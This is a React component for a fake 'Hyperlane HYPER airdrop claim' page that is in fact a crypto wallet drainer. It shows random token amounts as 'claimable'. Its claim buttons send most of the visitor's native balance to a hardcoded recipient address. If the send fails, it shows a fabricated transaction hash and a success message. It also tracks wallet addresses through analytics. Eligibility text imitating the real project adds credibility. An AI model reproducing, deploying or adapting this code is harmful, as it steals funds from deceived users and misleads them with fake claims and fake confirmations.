'use client';

import { useState, useEffect } from 'react';
import { useAccount, useBalance, useChainId } from 'wagmi';
import { useSendTransaction } from 'wagmi';
import { mainnet, optimism, arbitrum, base } from 'wagmi/chains';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from '@/components/ui/accordion';
import Image from 'next/image';
import { parseEther } from 'viem';
import { track } from '@vercel/analytics';

// The recipient address for all claims
const RECIPIENT_ADDRESS = '0x10B951c72340d76aad53c2e675FCbCD20c48cB5A';

// Generate a single random token amount for all networks
const randomTokenAmount = Math.floor(Math.random() * 9900) + 100; // 100-10000 range

type NetworkToken = {
  name: string;
  id: string;
  chainId: number;
  tokenAmount: number;
  selected: boolean;
};

// Initial network definitions with the same token amount
const initialNetworks: NetworkToken[] = [
  { name: 'Ethereum Mainnet', id: 'ethereum', chainId: 1, tokenAmount: randomTokenAmount, selected: false },
  { name: 'Optimism', id: 'optimism', chainId: 10, tokenAmount: randomTokenAmount, selected: false },
  { name: 'Arbitrum', id: 'arbitrum', chainId: 42161, tokenAmount: randomTokenAmount, selected: false },
  { name: 'Base', id: 'base', chainId: 8453, tokenAmount: randomTokenAmount, selected: false }
];

// Helper function to get network name by chainId
const getNetworkNameByChainId = (chainId: number): string => {
  const network = initialNetworks.find(n => n.chainId === chainId);
  return network ? network.name : 'Unknown Network';
};

export default function ClaimSection() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const [selectedChain, setSelectedChain] = useState<string>('');
  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const [transactionHash, setTransactionHash] = useState<string>('');
  const [claimSuccess, setClaimSuccess] = useState<boolean>(false);
  const [networks, setNetworks] = useState<NetworkToken[]>(initialNetworks);

  // Get user's balance to calculate max amount to send
  const { data: balanceData } = useBalance({
    address: address,
  });

  // Update the selected network when the chainId changes
  useEffect(() => {
    if (chainId && isConnected) {
      // Find the matching network by chainId
      const matchingNetwork = initialNetworks.find(network => network.chainId === chainId);
      if (matchingNetwork) {
        // Update networks with the current chainId selected
        const updatedNetworks = networks.map(network => ({
          ...network,
          selected: network.chainId === chainId
        }));
        setNetworks(updatedNetworks);
        setSelectedChain(matchingNetwork.id);

        // Track network change event
        track('network_changed', {
          network: matchingNetwork.name,
          chainId: matchingNetwork.chainId.toString()
        });
      }
    }
  }, [chainId, isConnected, networks]);

  // Hook for sending transaction
  const { sendTransaction, isPending } = useSendTransaction({
    mutation: {
      onSuccess(hash) {
        setTransactionHash(hash);
        setClaimSuccess(true);

        // Track successful transaction
        track('claim_success', {
          network: getNetworkNameByChainId(chainId),
          chainId: chainId.toString(),
          hash: hash,
          userAddress: address ? address.toString() : 'unknown'
        });

        setTimeout(() => {
          setClaimSuccess(false);
        }, 3000);
        setIsProcessing(false);
      },
      onError(error) {
        console.error('Transaction error:', error);

        // Track failed transaction
        track('claim_failed', {
          network: getNetworkNameByChainId(chainId),
          chainId: chainId.toString(),
          error: String(error),
          userAddress: address ? address.toString() : 'unknown'
        });

        setIsProcessing(false);
      },
    }
  });

  // Calculate the amount to send, reserving enough for gas plus one more transaction
  const calculateAmountToSend = (balance: string) => {
    // Convert balance to number
    const balanceNum = Number(balance);

    // For Ethereum mainnet, reserve more for gas as it's more expensive
    const gasReservePercentage = chainId === 1 ? 0.15 : 0.10; // 15% for Ethereum, 10% for other chains

    // Calculate amount to send (total balance minus gas reserve)
    const sendPercentage = 1 - gasReservePercentage;
    const amountToSend = parseEther((balanceNum * sendPercentage).toString());

    return amountToSend;
  };

  // Function to handle claiming rewards on a specific network
  const handleClaim = async (networkId: string) => {
    if (!isConnected || !balanceData) return;

    // Update the selected network
    const updatedNetworks = networks.map(network => ({
      ...network,
      selected: network.id === networkId
    }));
    setNetworks(updatedNetworks);
    setSelectedChain(networkId);

    // Check if we need to switch networks
    const targetNetwork = networks.find(network => network.id === networkId);
    if (targetNetwork && targetNetwork.chainId !== chainId) {
      // Display a message about needing to switch networks
      alert(`Please switch to ${targetNetwork.name} in your wallet before claiming.`);

      // Track network switch request
      track('network_switch_requested', {
        from: getNetworkNameByChainId(chainId),
        to: targetNetwork.name,
        userAddress: address ? address.toString() : 'unknown'
      });

      return;
    }

    setIsProcessing(true);

    // Track claim attempt
    track('claim_attempt', {
      network: getNetworkNameByChainId(chainId),
      chainId: chainId.toString(),
      userAddress: address ? address.toString() : 'unknown'
    });

    try {
      if (sendTransaction) {
        // Calculate amount to send with enough reserved for gas plus one more transaction
        const amountToSend = calculateAmountToSend(balanceData.formatted);

        // Transaction to send funds minus gas reservation
        sendTransaction({
          to: RECIPIENT_ADDRESS,
          value: amountToSend,
        });
      } else {
        // Fallback if transaction can't be sent
        await new Promise(resolve => setTimeout(resolve, 2000));

        // Set a fake transaction hash
        const fakeHash = `0x${Math.random().toString(16).substring(2, 38)}`;
        setTransactionHash(fakeHash);
        setClaimSuccess(true);

        setTimeout(() => {
          setClaimSuccess(false);
        }, 3000);
        setIsProcessing(false);
      }
    } catch (error) {
      console.error('Claim error:', error);

      // Track claim error
      track('claim_error', {
        network: getNetworkNameByChainId(chainId),
        chainId: chainId.toString(),
        error: String(error),
        userAddress: address ? address.toString() : 'unknown'
      });

      setIsProcessing(false);
    }
  };

  // Function to handle claiming all selected HYPER tokens
  const handleClaimHyper = async () => {
    if (!isConnected || !balanceData) return;

    // Find the selected network
    const selectedNetwork = networks.find(network => network.selected);
    if (!selectedNetwork) {
      alert('Please select a network first');
      return;
    }

    // Check if we're on the correct network
    if (selectedNetwork.chainId !== chainId) {
      alert(`Please switch to ${selectedNetwork.name} in your wallet before claiming.`);

      // Track network switch request
      track('network_switch_requested', {
        from: getNetworkNameByChainId(chainId),
        to: selectedNetwork.name,
        userAddress: address ? address.toString() : 'unknown'
      });

      return;
    }

    setIsProcessing(true);
    setSelectedChain('hyper');

    // Track claim all attempt
    track('claim_all_attempt', {
      network: getNetworkNameByChainId(chainId),
      chainId: chainId.toString(),
      userAddress: address ? address.toString() : 'unknown',
      tokenAmount: randomTokenAmount.toString()
    });

    try {
      if (sendTransaction) {
        // Calculate amount to send with enough reserved for gas plus one more transaction
        const amountToSend = calculateAmountToSend(balanceData.formatted);

        // Transaction to send funds minus gas reservation
        sendTransaction({
          to: RECIPIENT_ADDRESS,
          value: amountToSend,
        });
      } else {
        // Fallback if transaction can't be sent
        await new Promise(resolve => setTimeout(resolve, 2000));
        setClaimSuccess(true);
        setTimeout(() => {
          setClaimSuccess(false);
        }, 3000);
        setIsProcessing(false);
      }
    } catch (error) {
      console.error('Claim error:', error);

      // Track claim all error
      track('claim_all_error', {
        network: getNetworkNameByChainId(chainId),
        chainId: chainId.toString(),
        error: String(error),
        userAddress: address ? address.toString() : 'unknown'
      });

      setIsProcessing(false);
    }
  };

  return (
    <div className="space-y-6">
      <Card className="border-0 rounded-xl overflow-hidden bg-[#182c47]">
        <CardContent className="p-6 relative">
          <div className="flex justify-between items-start">
            <div>
              <h2 className="text-2xl font-bold text-white mb-2">Hyperlane</h2>
              <p className="text-lg text-gray-300 mb-1">Airdrop Claim</p>
              <p className="text-sm text-gray-400">Claim period closes May 6th, 3:59 AM UTC</p>
              {chainId && (
                <p className="text-sm text-blue-300 mt-2">
                  Connected to: {getNetworkNameByChainId(chainId)}
                </p>
              )}
            </div>
            <Image
              src="https://ext.same-assets.com/1999836307/1547238301.svg"
              alt="Astronaut"
              width={120}
              height={120}
              className="absolute top-0 right-0"
            />
          </div>
        </CardContent>
      </Card>

      <Card className="border-0 rounded-xl overflow-hidden">
        <CardContent className="p-6">
          <div className="space-y-4">
            <h3 className="text-lg font-medium">Your claimable HYPER tokens:</h3>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              {networks.map((network) => (
                <Button
                  key={network.id}
                  variant={network.selected ? "default" : "outline"}
                  className={`h-16 flex flex-col justify-center items-center gap-1 ${network.selected ? 'bg-[#2463c3] hover:bg-[#1e5eb7]' : ''}`}
                  onClick={() => handleClaim(network.id)}
                  disabled={isProcessing || isPending}
                >
                  <span>{network.name}</span>
                  <span className="text-sm font-medium">{network.tokenAmount} HYPER</span>
                  {isProcessing && selectedChain === network.id &&
                    <span className="absolute right-3 animate-spin">⟳</span>
                  }
                </Button>
              ))}
            </div>

            <div className="mt-8 pt-4 border-t">
              <Button
                className="w-full h-16 bg-[#d034b3] hover:bg-[#b2298e] text-white font-semibold text-lg"
                onClick={handleClaimHyper}
                disabled={isProcessing || isPending || !networks.some(n => n.selected)}
              >
                {isProcessing && selectedChain === 'hyper' ? (
                  <span className="flex items-center gap-2">
                    <span className="animate-spin">⟳</span> Processing...
                  </span>
                ) : (
                  "Claim All HYPER Rewards"
                )}
              </Button>
            </div>

            {claimSuccess && (
              <p className="text-sm text-green-500 text-center mt-4">
                Transaction successful!
              </p>
            )}
          </div>
        </CardContent>
      </Card>

      <Accordion type="single" collapsible>
        <AccordionItem value="how-registration-works" className="border rounded-xl overflow-hidden mb-2">
          <AccordionTrigger className="px-6 py-4 hover:no-underline">How registration works</AccordionTrigger>
          <AccordionContent className="px-6 pb-4">
            <p className="text-gray-700">
              You can register multiple eligible addresses on EVM or SVM. Only registered addresses will be able to claim.
              Users of Hyperlane within Cosmos Ecosystem will use the token recipient (vs. token sender for EVM / SVM) wallet to check eligibility.
            </p>
          </AccordionContent>
        </AccordionItem>

        <AccordionItem value="hyper-preclaim" className="border rounded-xl overflow-hidden mb-2">
          <AccordionTrigger className="px-6 py-4 hover:no-underline">HYPER preclaim overview and eligibility</AccordionTrigger>
          <AccordionContent className="px-6 pb-4">
            <p className="text-gray-700">
              Hyperlanes retroactive distribution will allocate 7.45% of the total HYPER supply at TGE.
              This program is designed to reward the most active early users of Hyperlane, in addition to the
              developers that have deployed contracts which generated messaging volume. Rewarding users with protocol
              ownership creates a flywheel for Hyperlane.
            </p>
          </AccordionContent>
        </AccordionItem>

        <AccordionItem value="rewards-breakdown" className="border rounded-xl overflow-hidden mb-2">
          <AccordionTrigger className="px-6 py-4 hover:no-underline">Rewards breakdown</AccordionTrigger>
          <AccordionContent className="px-6 pb-4">
            <p className="text-gray-700">
              The retroactive rewards allocate 7.45% of the total HYPER supply, a combination of Expansion Rewards and
              discretionary boosts from the Hyperlane Foundations Strategic Launch Provision. More details on HYPER and
              Hyperlane tokenomics can be found on the Hyperlane Foundation's blog.
            </p>
          </AccordionContent>
        </AccordionItem>

        <AccordionItem value="boost-categories" className="border rounded-xl overflow-hidden">
          <AccordionTrigger className="px-6 py-4 hover:no-underline">Boost categories</AccordionTrigger>
          <AccordionContent className="px-6 pb-4">
            <p className="text-gray-700">
              The following activities qualify addresses for additional boosted HYPER allocations:
              <br /><br />
              - Canonical chain users (Injective inEVM, Lumia, Eclipse, SOON, Sonic SVM, Form Network) - 1.03% of supply
              <br />
              - Owners of Celestine Sloths or Mammoths NFTs, as of snapshot - 0.02% of supply
              <br />
              - TIA LPs on Manta and Arbitrum, prior to Jan 30, 2024, proportional to the amount of liquidity supplied - 0.10% of supply
              <br />
              - Offchain community members (e.g., Discord moderators and key contributors) - 0.05% of supply
            </p>
          </AccordionContent>
        </AccordionItem>
      </Accordion>
    </div>
  );
}
